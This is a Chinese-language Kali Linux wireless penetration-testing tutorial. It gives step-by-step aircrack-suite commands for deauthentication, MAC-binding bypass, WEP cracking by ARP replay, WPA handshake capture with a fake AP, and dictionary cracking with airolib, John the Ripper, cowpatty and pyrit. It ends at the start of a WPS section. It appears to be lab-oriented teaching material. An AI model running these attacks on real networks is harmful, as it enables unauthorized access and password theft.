<p><code>#/s</code>：最近10秒内，每秒平均抓到的帧的数量</p>
<p><code>CH</code>：信道号(从<code>beacon</code>帧中获得)，信道重叠时可能会发现其他信道</p>
<p><code>MB</code>：<code>AP</code>支持的最大速率</p>
<p><code>ENC</code>：采用的无线安全技术(<code>WEP</code>、<code>WPA</code>、<code>WPA2</code>、<code>OPEN</code>)</p>
<p><code>CIPHER</code>：<code>AP</code>所使用的加密套件(<code>CCMP</code>、<code>TKIP</code>、<code>WEP40</code>、<code>WEP104</code>)</p>
<p><code>AUTH</code>：<code>AP</code>所使用的身份认证方式（<code>MGT</code>、<code>PSK</code>(<code>WPA</code>预设共享密钥)、<code>SKA</code>(<code>WEP</code>预设共享密钥)、<code>OPEN</code>）</p>
<p><code>ESSID</code>：无线网络名称。隐藏<code>AP</code>的此值可能为空。<code>airodump</code>可以从<code>probe</code>和<code>association request</code>帧中发现隐藏<code>AP</code></p>
<p><code>STATION</code>：终端的<code>MAC</code>地址</p>
<p><code>Lost</code>：通过<code>sequence number</code>判断最近10秒<code>STATION</code>发送丢失的数据包数量(管理帧、数据帧)。影响此值的因素：干扰、距离、发包不能收，收包不能发</p>
<p><code>Packets(Frames)</code>：<code>STATION</code>发送的数据包数量</p>
<p><code>Probes</code>：<code>STATION</code>正在探测的<code>ESSID</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan2mon -c 1</span><br><span class="line"></span><br><span class="line">-c：指定侦听的信道</span><br><span class="line">-bssid：指定要抓包的AP</span><br><span class="line">-w：输出保存</span><br><span class="line">--ivs：在使用WEP加密的流量中，只抓取其中ivs的信息</span><br></pre></td></tr></table></figure>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/38.png" alt="38.png"></p>
<h5 id="airodump-ng排错"><a href="#airodump-ng排错" class="headerlink" title="airodump-ng排错"></a>airodump-ng排错</h5><h6 id="不显示任何AP和STATION信息"><a href="#不显示任何AP和STATION信息" class="headerlink" title="不显示任何AP和STATION信息"></a>不显示任何<code>AP</code>和<code>STATION</code>信息</h6><ol>
<li><p>尝试禁用<code>network-manager</code>服务</p>
</li>
<li><p>确认无线网卡在<code>managed</code>模式下可以正常工作</p>
</li>
<li><p>物理机使用内置无线网卡时，确保<code>BIOS</code>中已启用无线网卡</p>
</li>
<li><p>尝试卸载驱动(<code>rmmod</code>)和重新加载驱动(<code>modprobe</code>)</p>
</li>
</ol>
<h6 id="工作一段时间后airodump-ng无法继续抓包"><a href="#工作一段时间后airodump-ng无法继续抓包" class="headerlink" title="工作一段时间后airodump-ng无法继续抓包"></a>工作一段时间后airodump-ng无法继续抓包</h6><ol>
<li><p><code>airmon-ng check kill</code></p>
</li>
<li><p>确认<code>wpa_supplicant</code>进程已停止</p>
</li>
</ol>
<h4 id="aireplay-ng注入包"><a href="#aireplay-ng注入包" class="headerlink" title="aireplay-ng注入包"></a>aireplay-ng注入包</h4><h5 id="基本测试"><a href="#基本测试" class="headerlink" title="基本测试"></a>基本测试</h5><p>检测<code>AP</code>对<code>probe requests</code>广播的响应</p>
<p>向每个<code>AP</code>发送30个包</p>
<p>判断网卡成功发送并可接收包的能力</p>
<p><strong>多次测试，避免无线通信质量不稳定</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -9 wlan0mon</span><br></pre></td></tr></table></figure>
<h5 id="向隐藏AP-指定SSID注入包测试"><a href="#向隐藏AP-指定SSID注入包测试" class="headerlink" title="向隐藏AP/指定SSID注入包测试"></a>向隐藏AP/指定SSID注入包测试</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -9 -e ESSID -a 00:00:00:00:00:00 wlan0mon</span><br><span class="line"></span><br><span class="line">-e：指定ESSID</span><br><span class="line">-a：指定无线AP的MAC地址</span><br></pre></td></tr></table></figure>
<h5 id="card-to-card-注入测试"><a href="#card-to-card-注入测试" class="headerlink" title="card to card 注入测试"></a>card to card 注入测试</h5><p>同一主机拥有两块置为<code>monitor</code>模式的无线网卡</p>
<p>其中网卡1作为发包方，网卡2模拟为一个<code>AP</code>，作为收包方，测试0-8号无线包是否可以注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -9 -i wlan0mon wlan1mon</span><br><span class="line"></span><br><span class="line">-i：指定模拟为AP的收包方网卡名称</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="MAC地址绑定攻击"><a href="#MAC地址绑定攻击" class="headerlink" title="MAC地址绑定攻击"></a>MAC地址绑定攻击</h2><p>网络管理员误认为<code>MAC</code>绑定是一种安全机制，但其实在软件层面可以将<code>MAC</code>地址临时或者永久修改掉</p>
<h3 id="设置AP"><a href="#设置AP" class="headerlink" title="设置AP"></a>设置AP</h3><p>将<code>AP</code>设置为<code>open</code>模式</p>
<p>设置<code>MAC</code>地址白名单，只允许一个<code>MAC</code>链接到此<code>AP</code></p>
<h3 id="配置用于侦听的一台kali"><a href="#配置用于侦听的一台kali" class="headerlink" title="配置用于侦听的一台kali"></a>配置用于侦听的一台kali</h3><p>可以通过无线信道侦听，获取到与<code>AP</code>正常通信的无线网卡的<code>MAC</code>地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop</span><br><span class="line">airmon-ng check kill</span><br><span class="line">映射无线网卡至Kali虚拟机</span><br><span class="line">airmon-ng start wlan0 11	# 设置无线网卡与`AP`处于同一信道</span><br><span class="line">airodump-ng wlan0mon -c 11 --bssid 00:00:00:00:00:00</span><br></pre></td></tr></table></figure>
<h3 id="配置用于攻击的另一台kali"><a href="#配置用于攻击的另一台kali" class="headerlink" title="配置用于攻击的另一台kali"></a>配置用于攻击的另一台kali</h3><p>当一个<code>AP</code>采用<code>open</code>认证方式，无任何加密方法，但无法进行连接时，则可能进行<code>MAC</code>地址绑定</p>
<p>修改无法连接<code>AP</code>的无线网卡的<code>MAC</code>地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0 down</span><br><span class="line">macchanger -m 00:00:00:00:00:00 wlan0	# 将wlan0网卡的MAC地址进行修改	-m：指定要修改成的MAC地址</span><br><span class="line">ifconfig wlan0 up</span><br></pre></td></tr></table></figure></p>
<p>此时使用修改过<code>MAC</code>地址的无线网卡连接配置<code>MAC</code>地址绑定的<code>AP</code>，则可实现连接</p>
<p>此时，正常通信的无线网卡与修改过<code>MAC</code>地址的无线网卡两者的<code>MAC</code>地址相同，当两者与<code>AP</code>进行通信时，会出现丢包的情况</p>
<hr>
<h2 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a>WEP攻击</h2><h3 id="WEP密码破解原理"><a href="#WEP密码破解原理" class="headerlink" title="WEP密码破解原理"></a>WEP密码破解原理</h3><p><code>IV</code>值并非完全随机</p>
<p>每224个包可能出现一次<code>IV</code>重用</p>
<p>收集大量<code>IV</code>值之后找出相同<code>IV</code>及其对应密文，分析得出共享密码</p>
<p><code>ARP</code>回包中包含<code>IV</code></p>
<p><code>IV</code>足够多的情况下，任何复杂程度的<code>WEP</code>密码都可以被破解</p>
<h3 id="WEP共享密钥破解"><a href="#WEP共享密钥破解" class="headerlink" title="WEP共享密钥破解"></a>WEP共享密钥破解</h3><p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/39.png" alt="39.png"></p>
<ol>
<li><p>启动<code>monitor</code>模式</p>
</li>
<li><p>启动抓包并保存</p>
</li>
<li><p>抓取正常设备与<code>AP</code>的<code>Challenge</code>(挑战)消息和使用<code>PSK</code>加密<code>Challenge</code>的消息，通过这两者的<code>XOR</code>计算得出<code>keysrteam</code>(密钥流)</p>
<p> 当<code>STATION</code>与<code>AP</code>进行关联身份认证时才可能会抓取到两者消息，正常<code>STATION</code>与<code>AP</code>在通信过程中不会产生这两者信息，可以使用<code>aireplay-ng</code>的<code>Deauthentication</code>(0号包注入方式)使<code>STATION</code>与<code>AP</code>断开连接，此时<code>STATION</code>与<code>AP</code>会重新尝试连接进行身份认证，则可进行抓取</p>
<p> <code>Deauthentication</code>攻击方式在无客户端情况下攻击无效</p>
<p> <code>Deauthentication</code>排错：</p>
<ol>
<li><p>物理足够接近被攻击者</p>
</li>
<li><p>与被攻击者使用相同的无线标准<code>b、n、g</code></p>
</li>
<li><p><code>STATION</code>可能拒绝广播帧，建议<code>-c</code>指定<code>STATION</code></p>
</li>
</ol>
</li>
<li><p>利用<code>keystream</code>即可与<code>AP</code>建立关联(<code>fake authentication</code>)</p>
<p> <code>fake authentication</code>排错：</p>
<ol>
<li><p>某些<code>AP</code>验证客户端<code>MAC</code>地址<code>OUI</code>(<code>MAC</code>地址前三个字节)，确保<code>MAC</code>地址非任意伪造</p>
</li>
<li><p><code>AP</code>存在<code>MAC</code>地址绑定，首先进行<code>MAC</code>地址绑定攻击，再进行<code>WEP</code>攻击</p>
</li>
<li><p>报错<code>denied(code 1)is WPA in use</code>,表示<code>AP</code>使用<code>WPA/WPA2</code>加密方式，非<code>WEP</code>，不支持<code>fake authentication</code></p>
</li>
<li><p>使用真实<code>MAC</code>地址</p>
</li>
<li><p>物理靠近<code>AP</code></p>
</li>
<li><p>侦听信道必须与<code>AP</code>的工作信道一致</p>
</li>
</ol>
</li>
<li><p>执行<code>ARP</code>重放</p>
<p> <code>airodump-ng</code>抓包界面中的<code>#Data</code>数值在<code>WEP</code>中表示抓取到的<code>IV</code>值</p>
<p> <code>AP</code>发出的<code>ARP</code>响应包中包含有<code>IV</code>值，通过进行<code>ARP</code>的重放，获取大量<code>IV</code>值</p>
<ol>
<li><p>首先，攻击者执行<code>ARP</code>重放，但此时攻击者没有合法的<code>ARP</code>请求包</p>
</li>
<li><p>攻击者使用<code>Deauthentication</code>(0号包注入方式)使<code>STATION</code>与<code>AP</code>断开连接，此时<code>STATION</code>与<code>AP</code>会重新尝试连接，重新进行<code>ARP</code>请求，抓取<code>STATION</code>的<code>ARP</code>请求包，攻击者利用此包进行重放即可获取大量<code>ARP</code>响应包，获取大量<code>IV</code>值</p>
</li>
</ol>
</li>
<li><p>使用已抓取到的<code>IV</code>值，尝试进行密码破解</p>
</li>
</ol>
<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><ol>
<li><p>设置<code>AP</code>为<code>WEP</code>加密方式，密钥长度128位</p>
</li>
<li><p>侦听无线信道，保存</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 11 --bssid 00:00:00:00:00:00 -w wep wlan0mon</span><br></pre></td></tr></table></figure>
</li>
<li><p>抓取到的<code>XOR</code>计算的<code>keystream</code>保存在当前目录下的<code>.xor</code>文件中，以密文方式存储</p>
<p> 使用<code>Deauthentication</code>攻击方式抓取计算<code>keystream</code>，每次攻击发送128个包，64个给<code>AP</code>，64个给<code>STATION</code>，需要足够接近被攻击者</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 1 -a 00:00:00:00:00:00 -c 11:11:11:11:11:11 wlan0mon</span><br><span class="line"></span><br><span class="line">-0：第零种包注入方式，只注入包一次，0表示持续发包</span><br><span class="line">-a：指定AP的MAC地址</span><br><span class="line">-c：指定STATION的MAC地址，不指定此参数时，以广播方式攻击所有客户端</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用<code>keystream</code>与<code>AP</code>建立关联</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -1 60 -e kifi -y wep-xxx.xor -a 00:00:00:00:00:00 -h 11:11:11:11:11:11 wlan0mon</span><br><span class="line"></span><br><span class="line">-1：第一种包注入方式，每60秒进行重新关联</span><br><span class="line">-e：指定要关联的AP的ESSID</span><br><span class="line">-y：指定keystream文件</span><br><span class="line">-a：指定AP的MAC地址</span><br><span class="line">-h：指定攻击者无线网卡的MAC地址</span><br><span class="line">-o：每次身份认证只发一次认证数据包，默认为重复三次</span><br><span class="line">-q x：每x秒发送keep-live帧</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行<code>ARP</code>重放</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -3 -b 00:00:00:00:00:00 -h 11:11:11:11:11:11 wlan0mon</span><br><span class="line"></span><br><span class="line">-3：第三种包注入方式</span><br><span class="line">-b：指定AP的MAC地址</span><br><span class="line">-h：指定攻击者无线网卡的MAC地址</span><br></pre></td></tr></table></figure>
</li>
<li><p>触发<code>ARP</code>包的产生</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 1 -a 00:00:00:00:00:00 -c 11:11:11:11:11:11 wlan0mon</span><br><span class="line"></span><br><span class="line">-0：第零种包注入方式，只注入包一次</span><br><span class="line">-a：指定AP的MAC地址</span><br><span class="line">-c：指定STATION的MAC地址</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>AP</code>密码破解</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng wep-01.cap</span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<h2 id="WPA攻击"><a href="#WPA攻击" class="headerlink" title="WPA攻击"></a>WPA攻击</h2><h3 id="WPA-PSK攻击"><a href="#WPA-PSK攻击" class="headerlink" title="WPA PSK攻击"></a>WPA PSK攻击</h3><p><code>WPA</code>无<code>WEP</code>的弱点，<strong>只可使用暴力破解方式</strong></p>
<h4 id="PSK破解过程"><a href="#PSK破解过程" class="headerlink" title="PSK破解过程"></a>PSK破解过程</h4><ol>
<li><p>启动<code>monitor</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   service network-manager stop</span><br><span class="line">airmon-ng check kill</span><br><span class="line">airmon-ng start wlan0 11	# 设置无线网卡与`AP`处于同一信道</span><br><span class="line">airodump-ng wlan0mon -c 11 --bssid 00:00:00:00:00:00 -w wpa</span><br></pre></td></tr></table></figure>
</li>
<li><p>抓包并保存</p>
</li>
<li><p><code>Deauthentication</code>攻击获取四步握手信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 1 -a 00:00:00:00:00:00 -c 11:11:11:11:11:11 wlan0mon</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用字典进行暴力破解</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w a.txt wpa-01.cap</span><br><span class="line"></span><br><span class="line">-w：指定密码字典</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="无AP时WPA密码破解"><a href="#无AP时WPA密码破解" class="headerlink" title="无AP时WPA密码破解"></a>无AP时WPA密码破解</h4><p>当攻击者远离<code>AP</code>，但接近<code>STATION</code>，或者无<code>AP</code>时。</p>
<p>正常情况下，<code>STATION</code>在连接<code>AP</code>时，会向周围网络中发送数据包，探测<code>STATION</code>曾经连接过的<code>AP</code>是否在范围内，如果在，则自动进行连接。</p>
<p>这时，<code>STATION</code>会向周边网络透露无线连接信息，通过抓包可以掌握<code>AP</code>的名称等信息，以这些信息来伪造此<code>AP</code>；若加密方式相同，<code>STATION</code>会连接此伪造<code>AP</code>，通过抓取此连接过程四步握手中的前两步进行破解</p>
<ol>
<li><p>启动<code>monitor</code></p>
</li>
<li><p>开始抓包并保存</p>
</li>
<li><p>根据<code>probe</code>信息伪造相同<code>ESSID</code>的<code>AP</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng --essid xxx -c 11 wlan0mon</span><br><span class="line"></span><br><span class="line">--essid：设置伪造AP的名称</span><br><span class="line">-c：设置伪造AP的工作信道</span><br><span class="line">-w：表示使用WEP加密方式，默认为open认证方式</span><br><span class="line">-z：表示使用WPA1加密方式，-z 2为TKIP方式</span><br><span class="line">-Z：表示使用WPA2加密方式，-Z 4为CCMP方式</span><br></pre></td></tr></table></figure>
</li>
<li><p>抓取四步握手中的前两个包</p>
</li>
<li><p>使用字典进行暴力破解</p>
<p> <code>ESSID</code>+<code>PSK</code>+迭代4096次，通过<code>HASH</code>计算生成<code>PMK</code></p>
<p> <code>PMK</code>+两个随机数+<code>AP</code>的<code>MAC</code>地址+<code>STATION</code>的<code>MAC</code>地址，通过<code>HMAC-SHA1</code>散列算法或<code>PRF-X</code>散列算法生成<code>PTK</code></p>
<p> 此时通过字典暴力破解<code>PSK</code>，通过不断与<code>STATION</code>尝试连接即可</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w a.txt wpa-01.cap</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="提高WPA攻击效率工具"><a href="#提高WPA攻击效率工具" class="headerlink" title="提高WPA攻击效率工具"></a>提高WPA攻击效率工具</h3><p><code>WPA</code>攻击中，抓取数据包并不是攻击中的难点，难点在于抓取数据包后使用字典密码破解的过程</p>
<h4 id="AIROLIB破解密码"><a href="#AIROLIB破解密码" class="headerlink" title="AIROLIB破解密码"></a>AIROLIB破解密码</h4><p>设计用于存储<code>ESSID</code>和密码列表，使用<code>SQLite3</code>存储数据</p>
<p><code>AIROLIB</code>首先结合<code>ESSID</code>以及密码列表，通过计算生成<code>PMK</code>存储于数据库，此过程会消耗大量资源</p>
<p>在真正破解阶段，<code>AIROLIB</code>会直接使用已经生成好的<code>PMK</code>来生成<code>PTK</code>，之后通过完整性校验来破解密码，此过程速度快，且资源消耗较少，以此来提高破解速度</p>
<p>生成<code>PMK</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo kifi &gt; essid.txt	# 将要破解AP的ESSID存于文件中</span><br><span class="line">airolib-ng db --import essid essid.txt	# 创建名为db的数据库并导入ESSID</span><br><span class="line">airolib-ng db --stats	# 查看数据库状态</span><br><span class="line">airolib-ng db --import passwd a.txt	# 向数据库中导入密码，此时会自动筛选剔除不符合密码策略的密码</span><br><span class="line">airolib-ng db --batch	# 生成PMK</span><br></pre></td></tr></table></figure>
<p>破解密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -r db wpa-01.cap</span><br></pre></td></tr></table></figure>
<h4 id="JTR破解密码"><a href="#JTR破解密码" class="headerlink" title="JTR破解密码"></a>JTR破解密码</h4><p><code>John the ripper</code></p>
<p>支持规则扩展密码字典，避免存储大容量字典文件</p>
<p>获取地区手机号段，使用<code>JTR</code>动态增加号段后四位，实现破解</p>
<p>修改<code>John the ripper</code>配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/john/john.conf</span><br><span class="line"></span><br><span class="line">[List.Rules:Wordlist]</span><br><span class="line">$[0-9]$[0-9]$[0-9]$[0-9]</span><br></pre></td></tr></table></figure>
<p>生成字典测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=yd.txt --rules --stdout</span><br></pre></td></tr></table></figure>
<p>破解调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=yd.txt --rules --stdout | aircrack-ng -e kifi -w - wpa-01.cap</span><br></pre></td></tr></table></figure>
<h4 id="COWPATTY破解密码"><a href="#COWPATTY破解密码" class="headerlink" title="COWPATTY破解密码"></a>COWPATTY破解密码</h4><p><code>WPA</code>密码通用破解工具</p>
<ol>
<li><p>使用密码字典进行破解</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   cowpatty -r wpa-01.cap -f a.txt -s ESSID</span><br><span class="line"></span><br><span class="line">-r：指定抓包文件</span><br><span class="line">-f：指定密码字典</span><br><span class="line">-s：指定要破解AP的ESSID</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>PMK</code>彩虹表</p>
<p> 生成彩虹表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">genpmk -f a.txt -d pmkhash -s ESSID</span><br><span class="line"> </span><br><span class="line">-f：指定密码字典</span><br><span class="line">-d：指定生成的彩虹表存储的位置</span><br><span class="line">-s：指定要破解AP的ESSID</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>   使用生成的彩虹表破解密码</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cowpatty -r wpa-01.cap -d pmkhash -s ESSID</span><br><span class="line"> </span><br><span class="line">-r：指定抓包文件</span><br><span class="line">-d：指定使用的彩虹表</span><br><span class="line">-s：指定要破解AP的ESSID</span><br></pre></td></tr></table></figure>
<h4 id="PYRIT破解密码"><a href="#PYRIT破解密码" class="headerlink" title="PYRIT破解密码"></a>PYRIT破解密码</h4><p>与<code>AIROLIB</code>、<code>COWPATTY</code>相同，支持基于预计算<code>PMK</code>的方式来提高破解速度</p>
<p>优势：</p>
<ol>
<li><p><code>pyrit</code>除<code>CPU</code>外，可以利用<code>GPU</code>计算能力加速生成<code>PMK</code></p>
</li>
<li><p>本身支持抓包可获取四步握手，无需使用<code>airodump</code>抓包</p>
</li>
<li><p>也支持传统的读取<code>airodump</code>抓包获取四步握手的方式</p>
</li>
</ol>
<h6 id="使用pyrit抓取WPA四步握手"><a href="#使用pyrit抓取WPA四步握手" class="headerlink" title="使用pyrit抓取WPA四步握手"></a>使用<code>pyrit</code>抓取<code>WPA</code>四步握手</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pyrit -r wlan0mon -o wpapyrit.cap stripLive</span><br><span class="line"></span><br><span class="line">-r：指定抓包网卡</span><br><span class="line">-o：指定输出文件</span><br><span class="line">stripLive：表示剔除无用数据包</span><br></pre></td></tr></table></figure>
<h6 id="分析pyrit所抓取的四步握手数据包"><a href="#分析pyrit所抓取的四步握手数据包" class="headerlink" title="分析pyrit所抓取的四步握手数据包"></a>分析<code>pyrit</code>所抓取的四步握手数据包</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pyrit -r wpapyrit.cap analyze</span><br><span class="line"></span><br><span class="line">-r：指定所抓取的文件</span><br><span class="line">analyze：表示进行分析</span><br></pre></td></tr></table></figure>
<h6 id="使用airodump抓取的数据包，导入pyrit并筛选"><a href="#使用airodump抓取的数据包，导入pyrit并筛选" class="headerlink" title="使用airodump抓取的数据包，导入pyrit并筛选"></a>使用<code>airodump</code>抓取的数据包，导入<code>pyrit</code>并筛选</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pyrit -r wpa-01.cap -o wpapyrit.cap strip</span><br><span class="line"></span><br><span class="line">-r：指定由airodump抓取的数据包</span><br><span class="line">-o：指定进行筛选后的输出文件</span><br><span class="line">strip：表示进行数据包筛选</span><br></pre></td></tr></table></figure>
<h6 id="使用密码字典直接破解"><a href="#使用密码字典直接破解" class="headerlink" title="使用密码字典直接破解"></a>使用密码字典直接破解</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pyrit -r wpapyrit.cap -i a.txt -b 00:00:00:00:00:00 attack_passthrough</span><br><span class="line"></span><br><span class="line">-r：指定所抓取的文件</span><br><span class="line">-i：指定使用的密码字典</span><br><span class="line">-b：指定AP的MAC地址</span><br><span class="line">attack_passthrough：表示进行密码字典破解</span><br></pre></td></tr></table></figure>
<h6 id="数据库模式破解"><a href="#数据库模式破解" class="headerlink" title="数据库模式破解"></a>数据库模式破解</h6><p>默认使用基于文件的数据库，支持连接<code>SQL</code>数据库，用于存储计算的<code>PMK</code></p>
<p>查看默认数据库的状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrit eval</span><br></pre></td></tr></table></figure>
<p>导入密码字典，同时会剔除不合规的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrit -i a.txt import_passwords</span><br></pre></td></tr></table></figure>
<p>指定<code>ESSID</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrit -e ESSID create_essid</span><br></pre></td></tr></table></figure>
<p>计算<code>PMK</code>（使用<code>GPU</code>资源）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrit batch</span><br></pre></td></tr></table></figure>
<p>使用<code>PMK</code>彩虹表破解密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pyrit -r wpapyrit.cap -b 00:00:00:00:00:00 attack_db</span><br><span class="line"></span><br><span class="line">-r：指定抓包文件</span><br><span class="line">-b：指定要破解AP的MAC地址</span><br><span class="line">attack_db：表示使用彩虹表进行破解</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="WPS攻击"><a href="#WPS攻击" class="headerlink" title="WPS攻击"></a>WPS攻击</h2><p><code>WIRELESS PROTECTED SETUP</code></p>
<p><code>WPS</code>是<code>WiFi</code>联盟2006年开发的一项技术</p>
<ol>
<li><p>通过<code>PIN</code>码来简化无线接入的操作，无需记住<code>PSK</code></p>
</li>
<li><p>路由器与网卡各按一个按钮就可接入无线</p>
</li>
<li><p><code>PIN</code>码分为前后各4位的两段，共8位数字</p>
</li>
</ol>
<p>安全漏洞</p>
<ol>
<li><p>2011年发现存在安全漏洞</p>
</li>
<li><p>接入发起方可以根据路由器的返回信息判断<code>PIN</code>前4位是否正确</p>
</li>
<li><p><code>PIN</code>码的后4位只有1000种定义的组合(最后一位为校验值)</p>
</li>
<li><p>全部穷举破解测试只需要11000次尝试，破解<code>PIN</code>后，即可读取到<code>PSK</code></p>
</li>
<li><p>标准本身没有设计多次尝试锁定机制，目前多个厂商已实现锁定机制</p>
</li>
</ol>
<p>包括<code>Linksys</code>在内的很多厂家的无线路由器无法关闭<code>WPS</code>功能，即使在<code>WEB</code>界面中有关闭<code>WPS</code>按钮，配置也不会生效</p>
<p>攻击难度相对较低，防御却十分困难</p>
<p>一般可在4-10小时内爆破出<code>PSK</code></p>
<h3 id="攻击过程-1"><a href="#攻击过程-1" class="headerlink" title="攻击过程"></a>攻击过程</h3><ol>
<li><p>启动侦听模式后，发现支持<code>WPS</code>技术的<code>AP</code></p>
